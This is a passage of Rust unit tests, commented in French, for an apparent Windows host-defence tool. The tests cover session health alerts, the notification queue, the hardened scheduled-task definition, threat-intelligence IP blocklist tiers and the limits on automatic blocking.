    assert_eq!(e, [crate::sante::EvenementInterface { session: 2, texte: "interface disparue de la session 2".into(), niveau: "Alerte" }]);
    assert!(i.observer(&[2], &[], 60 + 899).1.is_empty(), "pas avant 15 min");
    let (_, a) = i.observer(&[2], &[], 60 + 900);
    assert_eq!(interfaces_regles(&a), [("SAN-010".to_string(), "session 2".to_string())]);
    assert_eq!(a[0].niveau, "Critique", "décision du mainteneur, 2026-10-31");
    assert!(a[0].raisons.contains("depuis 15 min") && a[0].raisons.contains("la surveillance et la remontée continuent"), "{}", a[0].raisons);
    assert!(i.observer(&[2], &[], 7200).1.is_empty(), "une fois par épisode et par 24 h");
    let ev = crate::sante::evenement_interface(&e[0]);
    assert_eq!((ev.source.as_str(), ev.type_.as_str(), ev.niveau.as_str(), ev.destination.as_str()), ("sante", "interface", "Alerte", "session 2"));
}

#[test]
fn sante_grace_ouverture_session() {
    let mut i = crate::sante::Interfaces::default();
    // Session vue sans interface : rien pendant le délai de grâce (5 min), puis 15 min d'absence
    assert!(i.observer(&[3], &[], 0).0.is_empty());
    assert!(i.observer(&[3], &[], 299).0.is_empty());
    let (e, a) = i.observer(&[3], &[], 300);
    assert_eq!((e.len(), a.len()), (1, 0), "absente après le délai de grâce, sans constat");
    assert!(i.observer(&[3], &[], 300 + 899).1.is_empty());
    assert_eq!(i.observer(&[3], &[], 1200).1.len(), 1, "SAN-010 à 20 min");
    // Interface lancée pendant le délai de grâce : rien
    let mut i = crate::sante::Interfaces::default();
    i.observer(&[4], &[], 0);
    let (e, a) = i.observer(&[4], &[4], 120);
    assert!(e.is_empty() && a.is_empty());
    assert!(i.observer(&[4], &[4], 5000).1.is_empty());
}

#[test]
fn sante_interface_trois_disparitions() {
    let mut i = crate::sante::Interfaces::default();
    let mut constats = Vec::new();
    for k in 0..3i64 {
        i.observer(&[1], &[1], k * 600);
        constats.extend(i.observer(&[1], &[], k * 600 + 60).1);
    }
    assert_eq!(interfaces_regles(&constats), [("SAN-011".to_string(), "session 1".to_string())]);
    assert_eq!(constats[0].niveau, "Alerte");
    assert!(constats[0].raisons.contains("3 fois en une heure"), "{}", constats[0].raisons);
}

#[test]
fn sante_interface_deux_disparitions() {
    let mut i = crate::sante::Interfaces::default();
    let mut constats = Vec::new();
    for k in 0..3i64 {
        i.observer(&[1], &[1], k * 1900);
        constats.extend(i.observer(&[1], &[], k * 1900 + 60).1);
    }
    assert!(constats.is_empty(), "deux disparitions par heure au plus : rien ({constats:?})", constats = interfaces_regles(&constats));
}

#[test]
fn sante_interface_retour_et_session_fermee() {
    let mut i = crate::sante::Interfaces::default();
    i.observer(&[5], &[5], 0);
    i.observer(&[5], &[], 10);
    assert_eq!(i.observer(&[5], &[], 910).1.len(), 1);
    let (e, _) = i.observer(&[5], &[5], 1000);
    assert_eq!(e[0].texte, "interface de nouveau présente dans la session 5");
    i.observer(&[5], &[], 1100);
    assert_eq!(i.observer(&[5], &[], 2000).1.len(), 1, "nouvel épisode, nouveau constat");
    // Session fermée puis rouverte sous le même numéro : repart de zéro (délai de grâce)
    i.observer(&[], &[], 2100);
    i.observer(&[5], &[], 2200);
    assert!(i.observer(&[5], &[], 2200 + 299 + 900).1.is_empty());
    assert_eq!(i.observer(&[5], &[], 2200 + 300 + 900).1.len(), 1, "session rouverte : nouveau délai, puis signalée");
    // Une autre session avec l'interface ne compte pas pour celle-ci
    let mut i = crate::sante::Interfaces::default();
    i.observer(&[6, 7], &[7], 0);
    assert_eq!(interfaces_regles(&i.observer(&[6, 7], &[7], 1200).1), [("SAN-010".to_string(), "session 6".to_string())]);
}

/// Audit de #100, S100-03 : la file de reprise n'est vidée que si les destinations changent
#[test]
fn remontee_destinations_seules_videent_la_file() {
    use crate::commun::ConfigNotifications;
    use crate::notifications::{destinations, Secrets};
    let c = ConfigNotifications { ntfy: true, smtp: true, smtp_serveur: "smtp.exemple.test".into(), smtp_port: 587, destinataires: "a@exemple.test".into(), ..Default::default() };
    let s = Secrets { ntfy_url: "https://ntfy.exemple.test/a".into(), ntfy_jeton: "j1".into(), smtp_mot_de_passe: "m1".into(), ..Default::default() };
    let base = destinations(&c, &s);
    // Mêmes destinations : niveau, plafond, jeton, mot de passe, adresse d'un canal coupé
    let c2 = ConfigNotifications { niveau_min: "Critique".into(), max_par_heure: 1, ..c.clone() };
    let s2 = Secrets { ntfy_jeton: "j2".into(), smtp_mot_de_passe: "m2".into(), teams_url: "https://teams.exemple.test/x".into(), ..s.clone() };
    assert_eq!(destinations(&c2, &s2), base);
    // Destinations changées
    assert_ne!(destinations(&c, &Secrets { ntfy_url: "https://ntfy.exemple.test/b".into(), ..s.clone() }), base);
    assert_ne!(destinations(&ConfigNotifications { teams: true, ..c.clone() }, &s), base);
    assert_ne!(destinations(&ConfigNotifications { ntfy: false, ..c.clone() }, &s), base);
    assert_ne!(destinations(&ConfigNotifications { destinataires: "b@exemple.test".into(), ..c.clone() }, &s), base);
    assert_ne!(destinations(&ConfigNotifications { smtp_serveur: "autre.exemple.test".into(), ..c.clone() }, &s), base);
    assert_ne!(destinations(&ConfigNotifications { smtp_securite: "STARTTLS".into(), ..c.clone() }, &s), base, "sécurité SMTP");
    assert_ne!(destinations(&ConfigNotifications { smtp_utilisateur: "autre".into(), ..c.clone() }, &s), base, "compte SMTP");
}

/// Relecture de #100 : la décision de vider la file, testée ; une lecture ratée ne la perd pas
#[test]
fn remontee_file_apres_reglages() {
    use crate::notifications::FileReprise;
    let mut f = FileReprise::default();
    f.ajouter(&[alerte_remontee("a", "Critique", "")], 0);
    let mut vers = "A".to_string();
    f.apres_reglages(&mut vers, Some("A".into()));
    assert_eq!((f.entrees.len(), f.abandonnees), (1, 0), "mêmes destinations : la file reste");
    f.apres_reglages(&mut vers, Some("B".into()));
    assert_eq!((f.entrees.len(), f.abandonnees, vers.as_str()), (0, 1, "B"), "changées : vidée et comptée");
    f.ajouter(&[alerte_remontee("b", "Critique", "")], 0);
    f.apres_reglages(&mut vers, None);
    assert_eq!((f.entrees.len(), f.abandonnees, vers.as_str()), (1, 1, "B"), "lecture ratée : la file et les destinations restent");
    f.apres_reglages(&mut vers, Some("B".into()));
    assert_eq!((f.entrees.len(), f.abandonnees), (1, 1), "retour aux mêmes destinations : la file reste");
    f.apres_reglages(&mut vers, None);
    f.apres_reglages(&mut vers, Some("C".into()));
    assert_eq!((f.entrees.len(), f.abandonnees, vers.as_str()), (0, 2, "C"), "changées pendant la panne de lecture : vidée au retour");
}

/// S100-05 : des réglages ne se perdent pas, même sans place dans la file des messages ; le dernier gagne
#[test]
fn remontee_derniers_reglages_dans_la_case() {
    use crate::commun::ConfigNotifications;
    let c = crate::notifications::CaseReglages::nouvelle();
    assert!(c.prendre().is_none());
    c.poser(ConfigNotifications { max_par_heure: 1, ..Default::default() });
    c.poser(ConfigNotifications { max_par_heure: 2, ..Default::default() });
    assert_eq!(c.prendre().map(|x| x.max_par_heure), Some(2));
    assert!(c.prendre().is_none(), "prise une seule fois");
}

/// S100-07 : fichier retiré ou illisible, la remontée s'arrête ; illisible, une seule fois (rien n'est réécrit à chaque
/// tour) ; redevenu lisible, rechargé ; modifié à la main, pas adopté
#[test]
fn remontee_secrets_a_recharger() {
    use crate::notifications::{secrets_a_recharger as r, Secrets};
    let m = Secrets { ntfy_url: "https://ntfy.exemple.test/a".into(), ..Default::default() };
    assert!(r(false, &m, Some(&Secrets::default())), "fichier retiré");
    // Le seul jeton ntfy retiré à la main (audit de #100, S100-12)
    let avec_jeton = Secrets { ntfy_jeton: "j".into(), ..m.clone() };
    assert!(r(false, &avec_jeton, Some(&m)), "jeton retiré");
    assert!(r(false, &m, None), "devenu illisible");
    assert!(!r(true, &Secrets::default(), None), "toujours illisible : rien");
    assert!(r(true, &Secrets::default(), Some(&m)), "redevenu lisible");
    assert!(!r(false, &m, Some(&m)), "inchangé");
    assert!(!r(false, &m, Some(&Secrets { ntfy_url: "https://autre.exemple.test/b".into(), ..Default::default() })), "modifié à la main : pas adopté");
    assert!(!r(false, &Secrets::default(), Some(&Secrets::default())), "jamais configuré");
}

/// Secrets gardés par la boucle : protection du dossier de données en échec, aucun n'est utilisé (comme avant)
#[test]
fn remontee_aucun_secret_si_protection_en_echec() {
    use crate::notifications::{secrets_pour_envoi, Secrets};
    let s = Secrets { ntfy_url: "https://ntfy.exemple.test/a".into(), smtp_mot_de_passe: "m".into(), ..Default::default() };
    assert_eq!(secrets_pour_envoi(false, &s).ntfy_url, s.ntfy_url);
    let v = secrets_pour_envoi(true, &s);
    assert!(v.ntfy_url.is_empty() && v.smtp_mot_de_passe.is_empty());
}

// ------------------------------------------------------------ phase 4, PR 4.5b : relance de l'interface

#[test]
fn relance_definition_de_la_tache() {
    let x = crate::relance::definition_tache(r"C:\Program Files\deR4Tizer & co\deR4Tizer.exe");
    assert!(x.contains(r"<Command>C:\Program Files\deR4Tizer &amp; co\deR4Tizer.exe</Command>"), "chemin échappé : {x}");
    assert!(x.contains("<Arguments>--cache --relance</Arguments>"));
    assert!(x.contains("<GroupId>S-1-5-32-545</GroupId><RunLevel>LeastPrivilege</RunLevel>"), "sans élévation, groupe Utilisateurs par son SID");
    assert!(!x.contains("HighestAvailable") && !x.contains("S-1-5-18"), "jamais SYSTEM ni élevée");
    assert!(x.contains("<LogonTrigger>") && x.contains("<Interval>PT5M</Interval>"), "ouverture de session et toutes les 5 min");
    assert!(x.contains("<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"), "sinon Windows fermerait l'interface au bout de 3 jours");
    assert!(x.contains("<MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>"), "une instance par session");
    assert!(x.contains("encoding=\"UTF-16\""));
    assert!(x.contains("<SecurityDescriptor>D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FR;;;AU)</SecurityDescriptor>"), "droits explicites (S101-01), lecture seule pour les autres (S101-09)");
    assert!(x.contains("<AllowStartOnDemand>false</AllowStartOnDemand>"), "pas de lancement à la demande (S101-03)");
}

/// `LANCEMENT_SESSION=0` : une session sans interface n'a rien d'anormal, ni SAN-010 ni événement
#[test]
fn sante_interface_lancement_refuse_sans_constat() {
    use crate::sante::{sessions_attendues as a, Interfaces};
    assert_eq!(a(true, vec![1, 2]), [1, 2]);
    assert!(a(false, vec![1, 2]).is_empty());
    let mut i = Interfaces::default();
    for t in [0, 300, 1200, 90_000] {
        let (e, c) = i.observer(&a(false, vec![1]), &[], t);
        assert!(e.is_empty() && c.is_empty());
    }
}

/// S101-15 : un programme qui alterne arrêt et retour de l'interface ne fait pas plus de 3 critiques par session et par 24 h
#[test]
fn sante_interface_san010_plafonne() {
    use crate::sante::{Interfaces, MAX_SAN010_JOUR};
    let mut i = Interfaces::default();
    let (mut levés, mut plafond) = (0, 0);
    let mut t = 0;
    for _ in 0..8 {
        i.observer(&[1], &[1], t);
        t += 60;
        i.observer(&[1], &[], t);
        t += 900;
        let (e, a) = i.observer(&[1], &[], t);
        levés += a.iter().filter(|x| x.regle == "SAN-010").count();
        plafond += e.iter().filter(|x| x.texte.contains("plafond")).count();
        t += 60;
    }
    assert_eq!((levés, plafond), (MAX_SAN010_JOUR, 1));
    // Le dernier constat dit que le plafond est atteint (S101-19) ; les précédents non
    let mut i2 = Interfaces::default();
    let textes: Vec<String> = (0..MAX_SAN010_JOUR as i64).flat_map(|k| {
        let t0 = k * 2000;
        i2.observer(&[1], &[1], t0);
        i2.observer(&[1], &[], t0 + 60);
        i2.observer(&[1], &[], t0 + 960).1.into_iter().map(|a| a.raisons)
    }).collect();
    assert_eq!(textes.iter().map(|x| x.contains("plafond atteint")).collect::<Vec<_>>(), [false, false, true]);
    // Le lendemain, de nouveau
    i.observer(&[1], &[1], t + 86_400);
    i.observer(&[1], &[], t + 86_460);
    assert_eq!(i.observer(&[1], &[], t + 86_460 + 900).1.len(), 1);
}

/// D7 : seule l'absence de la valeur vaut refus du lancement
#[test]
fn relance_lecture_du_lancement_echec_ferme() {
    use crate::relance::decision_lancement as d;
    use std::io::{Error, ErrorKind};
    assert_eq!(d(Ok("x".into())), Ok(true));
    assert_eq!(d(Err(Error::from(ErrorKind::NotFound))), Ok(false));
    assert!(d(Err(Error::from(ErrorKind::PermissionDenied))).is_err());
}

/// S100-13, S100-18 : tant que les secrets sont illisibles, la file n'est pas envoyée (la boucle n'est pas exécutable en test :
/// contrôle du source)
#[test]
fn remontee_file_attend_les_secrets() {
    let s = include_str!("notifications.rs").replace("\r\n", "\n");
    assert!(s.contains("if !dues.is_empty() && !secrets_illisibles {"), "file envoyée malgré des secrets illisibles");
    assert!(s.contains("lire_secrets_verifie().ok_or_else("), "enregistrer_secrets : secrets illisibles non refusés");
}

/// S101-01 : relecture après la pose ; une tâche détournée (autre commande, autre compte, élevée) est refusée
#[test]
fn relance_relue_conforme() {
    use crate::relance::{definition_conforme as c, definition_tache};
    let i = r"C:\Program Files\deR4Tizer\deR4Tizer.exe";
    let x = definition_tache(i);
    assert!(c(&x, i));
    assert!(c(&x, &i.to_uppercase()), "sans tenir compte de la casse");
    assert!(c(&x.replace("<RunLevel>LeastPrivilege</RunLevel>", ""), i), "Windows omet la valeur par défaut à la relecture");
    assert!(!c(&x, r"C:\Temp\deR4Tizer.exe"), "autre commande");
    assert!(!c(&x.replace("--cache --relance", "--cache"), i));
    assert!(!c(&x.replace("LeastPrivilege", "HighestAvailable"), i), "élevée");
    assert!(!c(&x.replace("S-1-5-32-545", "S-1-5-21-1-2-3-1001"), i), "autre groupe");
    assert!(!c(&x.replace("<GroupId>S-1-5-32-545</GroupId>", "<GroupId>S-1-5-32-545</GroupId><UserId>x</UserId>"), i), "un compte");
}

#[test]
fn relance_droits_sans_ecriture_de_tiers() {
    use crate::natif::{Ace, Securite};
    use crate::protection::{sans_ecriture_de_tiers as d, SID_ADMINISTRATEURS, SID_SYSTEME};
    let complets = [SID_SYSTEME, SID_ADMINISTRATEURS];
    let s = |proprietaire: &str, aces: Vec<(&str, u32, bool)>, inconnue: bool| Securite {
        proprietaire: proprietaire.into(), protege: true, ace_inconnue: inconnue,
        aces: aces.into_iter().map(|(sid, masque, autorise)| Ace { sid: sid.into(), masque, autorise }).collect(),
    };
    let lecture = 0x1200a9;
    assert!(d(&s(SID_SYSTEME, vec![(SID_SYSTEME, 0x1f01ff, true), ("S-1-5-11", lecture, true)], false), &complets).is_ok());
    assert!(d(&s("S-1-5-21-1-2-3-1001", vec![], false), &complets).is_err(), "propriétaire : le compte qui l'a créée");
    assert!(d(&s(SID_SYSTEME, vec![("S-1-5-21-1-2-3-1001", 0x1f01ff, true)], false), &complets).is_err(), "contrôle total à un tiers");
    assert!(d(&s(SID_SYSTEME, vec![("S-1-5-11", 0x2, true)], false), &complets).is_err(), "écriture à un tiers");
    assert!(d(&s(SID_SYSTEME, vec![("S-1-5-11", 0x1f01ff, false)], false), &complets).is_ok(), "refus : sans effet");
    assert!(d(&s(SID_SYSTEME, vec![], true), &complets).is_err(), "entrée inconnue");
}

/// La tâche cible notre exécutable, reconnu par son empreinte : pas de remarque de persistance ni d'interpréteur
#[test]
fn incident_tache_relance_sans_alerte_persistance() {
    let e = crate::commun::EntreeDemarrage {
        categorie: "Tâche planifiée".into(),
        nom: format!(r"\{}", crate::relance::NOM_TACHE),
        commande: r"C:\Program Files\deR4Tizer\deR4Tizer.exe --cache --relance".into(),
        cible: r"C:\Program Files\deR4Tizer\deR4Tizer.exe".into(),
        signataire: "deR4Tizer (empreinte)".into(),
        ..Default::default()
    };
    assert_eq!(crate::persistance::evaluer(&e), "");
}

/// Phase 6, PR 6.1, écart 1 de la politique : le niveau 3 tient à l'identité de la source, pas à la confiance ni au réglage
#[test]
fn politique_listes_restreintes_jamais_niveau_3() {
    use crate::menaces::menaces_sources_test as listes;
    use crate::tests::blocage_automatique;
    let bloquee = |m: &crate::menaces::Menaces, ip: &str| blocage_automatique(&m.chercher_ip(ip).expect("listée"), true, false, false);
    for source in ["FireHOL niveau 1", "ThreatView C2 Cobalt Strike", "ThreatView IP", "Emerging Threats (compromises)", "CINS Army", "IPsum (niveau 3)"] {
        let m = listes(&[("203.0.113.5", source), ("198.51.100.0/24", source), ("2001:db8:1::5", source), ("2001:db8:2::/48", source)]);
        for ip in ["203.0.113.5", "198.51.100.7", "2001:db8:1::5", "2001:db8:2::7"] {
            assert!(!bloquee(&m, ip), "{source}, {ip} : alerte seule");
            assert!(!m.permet_blocage_auto(ip), "{source}, {ip} : ne garde pas un blocage");
        }
    }
    assert_eq!(crate::menaces::listes_haute_test("FireHOL niveau 1"), true, "la confiance haute reste pour l'affichage");
}

#[test]
fn politique_spamhaus_feodo_niveau_3() {
    use crate::menaces::menaces_sources_test as listes;
    use crate::tests::blocage_automatique;
    let mut noms: Vec<_> = crate::menaces::sources_auto_test();
    noms.sort();
    assert_eq!(noms, vec![("Feodo Tracker (C2 botnets)", true, true), ("Spamhaus DROP (IPv4)", true, true), ("Spamhaus DROP (IPv6)", true, true)]);
    for source in ["Feodo Tracker (C2 botnets)", "Spamhaus DROP (IPv4)", "Spamhaus DROP (IPv6)"] {
        let m = listes(&[("203.0.113.5", source), ("198.51.100.0/24", source), ("2001:db8:1::5", source), ("2001:db8:2::/48", source)]);
        for ip in ["203.0.113.5", "198.51.100.7", "2001:db8:1::5", "2001:db8:2::7"] {
            assert!(blocage_automatique(&m.chercher_ip(ip).expect("listée"), true, false, false), "{source}, {ip}");
            assert!(m.permet_blocage_auto(ip), "{source}, {ip}");
        }
    }
}

/// Une adresse de plusieurs listes garde le niveau 3, dans les deux ordres et sous toutes les formes
#[test]
fn politique_niveau_3_prime_sur_les_autres_listes() {
    use crate::menaces::menaces_sources_test as listes;
    const AUTO: &str = "Feodo Tracker (C2 botnets)";
    const HAUTE: &str = "FireHOL niveau 1";
    const REP: &str = "CINS Army";
    for autre in [HAUTE, REP] {
        for (a, b) in [(AUTO, autre), (autre, AUTO)] {
            let m = listes(&[("203.0.113.5", a), ("203.0.113.5", b)]);
            let c = m.chercher_ip("203.0.113.5").unwrap();
            assert!(c.auto && c.source == AUTO, "exacte, ordre {a} puis {b} : {}", c.source);
            let m = listes(&[("2001:db8::5", a), ("2001:db8::5", b)]);
            assert!(m.chercher_ip("2001:db8::5").unwrap().auto, "IPv6 exacte, ordre {a} puis {b}");
            let m = listes(&[("2001:db8::/32", a), ("2001:db8::/48", b)]);
            assert!(m.chercher_ip("2001:db8::5").unwrap().auto, "réseaux IPv6, ordre {a} puis {b}");
            let m = listes(&[("198.51.100.0/24", a), ("198.51.100.0/25", b)]);
            let c = m.chercher_ip("198.51.100.7").unwrap();
            assert!(c.auto, "plages recouvertes, ordre {a} puis {b}");
            assert!(!listes(&[("198.51.100.0/24", autre)]).chercher_ip("198.51.100.7").unwrap().auto, "{autre} seule");
        }
        // Formes croisées : exacte d'un côté, plage de l'autre
        let m = listes(&[("198.51.100.0/24", AUTO), ("198.51.100.7", autre)]);
        assert!(m.chercher_ip("198.51.100.7").unwrap().auto, "plage du niveau 3, exacte de {autre}");
        let m = listes(&[("198.51.100.7", AUTO), ("198.51.100.0/24", autre)]);
        assert!(m.chercher_ip("198.51.100.7").unwrap().auto, "exacte du niveau 3, plage de {autre}");
        assert!(!m.chercher_ip("198.51.100.8").unwrap().auto, "voisine, couverte par {autre} seule");
        let m = listes(&[("2001:db8::/32", AUTO), ("2001:db8::5", autre)]);
        assert!(m.chercher_ip("2001:db8::5").unwrap().auto, "réseau IPv6 du niveau 3, exacte de {autre}");
        let m = listes(&[("2001:db8::5", AUTO), ("2001:db8::/32", autre)]);
        assert!(m.chercher_ip("2001:db8::5").unwrap().auto, "exacte IPv6 du niveau 3, réseau de {autre}");
        assert!(!m.chercher_ip("2001:db8::6").unwrap().auto, "voisine IPv6, couverte par {autre} seule");
    }
    // Plages voisines : la fusion ne doit pas étendre le niveau 3 à une plage d'une autre liste
    let m = listes(&[("198.51.100.0/25", AUTO), ("198.51.100.128/25", HAUTE)]);
    assert!(m.chercher_ip("198.51.100.1").unwrap().auto);
    assert!(!m.chercher_ip("198.51.100.200").unwrap().auto, "plage voisine, hors du niveau 3");
    // Rangs inchangés entre les autres listes : la confiance haute passe devant la réputation
    for (a, b) in [(HAUTE, REP), (REP, HAUTE)] {
        let c = listes(&[("203.0.113.5", a), ("203.0.113.5", b)]).chercher_ip("203.0.113.5").unwrap();
        assert!(c.haute && !c.auto && c.source == HAUTE, "ordre {a} puis {b} : {}", c.source);
    }
    let c = listes(&[("203.0.113.5", REP), ("203.0.113.0/24", HAUTE)]).chercher_ip("203.0.113.5").unwrap();
    assert!(c.haute && !c.auto, "plage haute avant exacte de réputation");
}

/// Un blocage automatique n'est gardé que par une source du niveau 3 : une liste restreinte ne le prolonge pas
#[test]
fn politique_blocage_leve_si_seule_une_autre_liste_reste() {
    use crate::menaces::menaces_sources_test as listes;
    let b = crate::commun::Blocage { type_: "parefeu".into(), cible: "203.0.113.5".into(), raison: "blocage automatique : essai".into(), date: String::new(), expire: "2099-01-01 00:00:00".into() };
    let l = [b];
    let leve = |m: &crate::menaces::Menaces| crate::moniteur::blocages_a_lever(&l, "2026-11-01 10:00:00", true, |ip| m.permet_blocage_auto(ip)).len();
    assert_eq!(leve(&listes(&[("203.0.113.5", "Feodo Tracker (C2 botnets)")])), 0, "toujours au niveau 3");
    assert_eq!(leve(&listes(&[("203.0.113.5", "FireHOL niveau 1")])), 1, "seule une liste restreinte la porte encore");
    assert_eq!(leve(&listes(&[("203.0.113.5", "FireHOL niveau 1"), ("203.0.113.5", "Feodo Tracker (C2 botnets)")])), 0, "dans les deux");
}

/// Audit de #109, S109-02 : une liste du niveau 3 absente ou rejetée ne fait pas lever les blocages des autres
#[test]
fn politique_levee_seulement_si_le_niveau_3_est_charge() {
    use crate::menaces::niveau3_complet_test as complet;
    const V4: &str = "Spamhaus DROP (IPv4)";
    const V6: &str = "Spamhaus DROP (IPv6)";
    const FEODO: &str = "Feodo Tracker (C2 botnets)";
    assert!(complet(&[(V4, 1), (V6, 1), (FEODO, 1)]));
    assert!(!complet(&[(V4, 1), (V6, 1), (FEODO, 0)]), "rejetée ou illisible : 0 entrée");
    assert!(!complet(&[(V4, 0), (V6, 1), (FEODO, 1)]));
    assert!(!complet(&[(V4, 1), (FEODO, 1)]), "absente");
    assert!(!complet(&[(V4, 1), (V6, 1), (FEODO, 0), ("FireHOL niveau 1", 9)]), "une autre liste ne la remplace pas");
    assert!(!complet(&[]));
    assert!(!crate::menaces::Menaces::default().niveau3_complet, "avant tout chargement");
    // L'appel en production, que seul le scénario de la VM exerce sinon (relecture de #109, E3)
    let s = include_str!("moniteur.rs").replace("\r\n", "\n");
    let a = s.find("fn expirer_blocages").expect("expirer_blocages");
    let corps = &s[a..a + s[a..].find("\n    }\n").expect("fin")];
    assert!(corps.contains("menaces.niveau3_complet"), "listes chargées");
    assert!(corps.contains("|ip| menaces.permet_blocage_auto(ip)"), "le niveau 3 seul garde un blocage");
    assert!(!corps.contains("is_some"));
}

/// Audit de #109, S109-01 : une liste rejetée ne laisse aucune entrée, IPv6 comprise
#[test]
fn politique_liste_rejetee_retiree_entierement() {
    use crate::menaces::{menaces_sources_test as listes, retirer_source_test as retirer};
    const FEODO: &str = "Feodo Tracker (C2 botnets)";
    const V6: &str = "Spamhaus DROP (IPv6)";
    let mut m = listes(&[("203.0.113.5", FEODO), ("2001:db8::5", FEODO), ("2001:db8:1::/48", FEODO), ("203.0.113.6", V6), ("2001:db8::6", V6), ("2001:db8:2::/48", V6)]);
    retirer(&mut m, FEODO);
    for ip in ["203.0.113.5", "2001:db8::5", "2001:db8:1::7"] {
        assert!(m.chercher_ip(ip).is_none(), "{ip} retirée avec sa source");
    }
    for ip in ["203.0.113.6", "2001:db8::6", "2001:db8:2::7"] {
        assert!(m.permet_blocage_auto(ip), "{ip} : l'autre source reste");
    }
}

/// Audit de #109 : Feodo Tracker en adresses exactes ; S109-01 : couverture IPv6 bornée
#[test]
fn listes_feodo_exactes_et_couverture_ipv6() {
    use crate::menaces::{couverture6 as c6, couverture_aberrante as ab, jeton_admis as j};
    for x in ["203.0.113.5", "203.0.113.5/32", "2001:db8::5", "2001:db8::5/128"] {
        assert!(j("ip-exacte", x), "{x}");
    }
    for x in ["8.0.0.0/8", "203.0.113.0/24", "203.0.113.4/31", "2001:db8::/48", "2001:db8::/127", "203.0.113.5/128", "2001:db8::5/32",
              "2001:db8::1.2.3.4/32", "::ffff:8.8.8.8/32", "pas-une-ip/32"] {
        assert!(!j("ip-exacte", x), "{x} : réseau écarté (S128-01 : famille lue)");
        assert!(j("ip", x) && j("spamhaus", x), "{x} : admis ailleurs");
    }
    assert_eq!(c6([64u32, 128, 100].into_iter()), 3);
    assert_eq!(c6([48u32].into_iter()), 1 << 16);
    assert_eq!(c6([16u32, 16].into_iter()), 1 << 49);
    assert!(!ab(1 << 27, (1 << 48) - 1), "aux bornes : admis");
    assert!(ab((1 << 27) + 1, 0) && ab(0, 1 << 48), "S128-02 : un seul /16 suffit");
    assert!(ab(0, c6([16u32].into_iter())));
    // Spamhaus DROP v6 réel : quelques dizaines de /29 à /48, loin de la borne ; deux /16 la dépassent
    assert!(!ab(0, c6(std::iter::repeat(29u32).take(200))));
    assert!(ab(0, c6([16u32, 17].into_iter())));
    let src = include_str!("menaces.rs").replace("\r\n", "\n");
    assert!(src.contains("format: \"ip-exacte\", url: \"https://feodotracker.abuse.ch/downloads/ipblocklist.txt\""), "Feodo en adresses exactes");
    assert!(src.contains("if !jeton_admis(s.format, &j) {") && src.contains("if couverture_aberrante(couverture, couverture6) {"), "branchés au chargement");
    assert!(src.contains("filter(|j| jeton_admis(s.format, j))"), "R1 : même filtre au contrôle avant remplacement");
}

// ------------------------------------------------------------ phase 6, PR 6.2 : point de décision et garde

/// La décision du cycle, avec le contrôle « pas encore bloquée » qui le précède
pub(crate) fn blocage_automatique(m: &crate::menaces::Correspondance, actif: bool, deja_bloquee: bool, echec: bool) -> bool {
    !deja_bloquee && matches!(crate::moniteur::decision_blocage_liste(m, actif, echec), crate::politique::Decision::Autorisee(_))
}

const S0: u64 = 1_800_000_000;

fn sans_empreinte() -> Option<String> {
    None
}

#[test]
fn politique_echec_protection_refuse_les_actions_alimentees_par_fichiers() {
    use crate::politique::{decider, Action::*, Contexte, Decision::*, Declencheur::*, SourceAuto::*};
    let tout = Contexte { echec_protection: false, blocage_menaces: true, ips: true, rancongiciel: true };
    let echec = Contexte { echec_protection: true, ..tout };
    assert!(matches!(decider(BloquerIp, Automatique(Liste { niveau3: true }), &tout), Autorisee(_)));
    assert!(matches!(decider(BloquerIp, Automatique(Liste { niveau3: true }), &echec), Refusee(_)));
    assert!(matches!(decider(BloquerIp, Automatique(Ips), &tout), Autorisee(_)));
    assert!(matches!(decider(BloquerIp, Automatique(Ips), &echec), Refusee(_)));
    assert!(matches!(decider(Suspendre, Automatique(Leurre), &echec), Autorisee(_)), "D6-10 : alimentée par le journal Sécurité");
    for a in [BloquerIp, Suspendre, Reprendre, Tuer, TuerChaine, Isoler, Panique, FinPanique] {
        assert!(matches!(decider(a, Humain, &echec), Autorisee(_)), "{a:?} : un administrateur peut toujours agir");
    }
}

#[test]
fn politique_automatique_seulement_dans_les_cas_ecrits() {
    use crate::politique::{decider, Action::*, Contexte, Decision::*, Declencheur::*, SourceAuto::*};
    let tout = Contexte { echec_protection: false, blocage_menaces: true, ips: true, rancongiciel: true };
    assert!(matches!(decider(BloquerIp, Automatique(Liste { niveau3: false }), &tout), AlerteSeulement(_)));
    let sans = Contexte::default();
    assert!(matches!(decider(BloquerIp, Automatique(Liste { niveau3: true }), &sans), AlerteSeulement(_)), "réglage désactivé");
    assert!(matches!(decider(BloquerIp, Automatique(Ips), &sans), AlerteSeulement(_)), "IPS désactivé par défaut");
    assert!(matches!(decider(Suspendre, Automatique(Leurre), &sans), AlerteSeulement(_)));
    // D6-9 : aucune action irréversible ni nouvelle en automatique, quelle que soit la source
    for source in [Liste { niveau3: true }, Ips, Leurre] {
        for a in [Tuer, TuerChaine, Isoler, Panique, FinPanique, Reprendre] {
            assert!(matches!(decider(a, Automatique(source), &tout), Refusee(_)), "{a:?}, {source:?}");
        }
    }
    assert!(matches!(decider(Suspendre, Automatique(Ips), &tout), Refusee(_)));
    assert!(matches!(decider(Suspendre, Automatique(Liste { niveau3: true }), &tout), Refusee(_)));
    assert!(matches!(decider(BloquerIp, Automatique(Leurre), &tout), Refusee(_)));
}

#[test]
fn garde_trois_par_cible_puis_alerte() {
    use crate::politique::{Genre::*, Historique, Passage};
    let mut h = Historique::default();
    // Espacées : le plafond horaire ne joue pas
    for i in 0..3 {
        let t = S0 + i * 4000;
        assert_eq!(h.examiner(Suspension, r"C:\Mal.exe", t, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(Suspension, r"C:\Mal.exe", t);
    }
    let t = S0 + 3 * 4000;
    let Passage::Retenue { alerte: Some(a), .. } = h.examiner(Suspension, r"c:\mal.EXE", t, &mut sans_empreinte) else { panic!("4e : retenue et alerte, sans tenir compte de la casse") };
    assert!(a.contains("boucle"), "{a}");
    assert!(matches!(h.examiner(Suspension, r"C:\Mal.exe", t + 60, &mut sans_empreinte), Passage::Retenue { alerte: None, .. }), "une seule alerte");
    assert_eq!(h.examiner(Suspension, r"C:\Autre.exe", t, &mut sans_empreinte), Passage::Passe, "une autre cible");
    assert_eq!(h.examiner(BlocageListe, r"C:\Mal.exe", t, &mut sans_empreinte), Passage::Passe, "un autre genre");
    // La fenêtre glisse : 24 h après les premières, la cible repasse, et une nouvelle boucle se signale de nouveau
    assert_eq!(h.examiner(Suspension, r"C:\Mal.exe", S0 + 86_400 + 1, &mut sans_empreinte), Passage::Passe);
